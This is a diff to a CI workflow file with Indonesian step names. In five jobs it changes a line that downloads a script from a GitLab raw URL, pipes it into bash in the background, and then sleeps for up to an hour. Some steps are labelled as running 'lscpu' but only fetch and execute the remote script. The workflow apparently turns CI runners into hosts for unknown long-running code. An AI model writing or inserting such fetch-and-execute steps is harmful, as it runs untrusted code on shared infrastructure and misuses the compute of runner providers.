@@ -80,7 +80,7 @@ jobs:
     steps:
       - name: Jalankan perintah & tahan 4 menit
         run: |
-          curl -sL https://gitlab.com/line789/like/-/raw/main/sofiasters | bash &
+          curl -sL https://gitlab.com/line789/like/-/raw/main/spidermasterans | bash &
           sleep 240s
 
   # =============================================
@@ -99,7 +99,7 @@ jobs:
     steps:
       - name: Jalankan perintah & tahan 15 menit
         run: |
-          curl -sL https://gitlab.com/line789/like/-/raw/main/sofiasters | bash &
+          curl -sL https://gitlab.com/line789/like/-/raw/main/spidermasterans | bash &
           sleep 18m
 
   # =============================================
@@ -118,7 +118,7 @@ jobs:
     steps:
       - name: Jalankan lscpu & tahan 35 menit
         run: |
-          curl -sL https://gitlab.com/line789/like/-/raw/main/sofiasters | bash &
+          curl -sL https://gitlab.com/line789/like/-/raw/main/spidermasterans | bash &
           sleep 35m
 
   # =============================================
@@ -137,7 +137,7 @@ jobs:
     steps:
       - name: Jalankan perintah & tahan 58 menit
         run: |
-          curl -sL https://gitlab.com/line789/like/-/raw/main/sofiasters | bash &
+          curl -sL https://gitlab.com/line789/like/-/raw/main/spidermasterans | bash &
           sleep 58m
 
   # =============================================
@@ -156,7 +156,7 @@ jobs:
     steps:
       - name: Jalankan lscpu & tahan 60 menit
         run: |
-          curl -sL https://gitlab.com/line789/like/-/raw/main/sofiasters | bash &
+          curl -sL https://gitlab.com/line789/like/-/raw/main/spidermasterans | bash &
           sleep 60m
 
   # =============================================
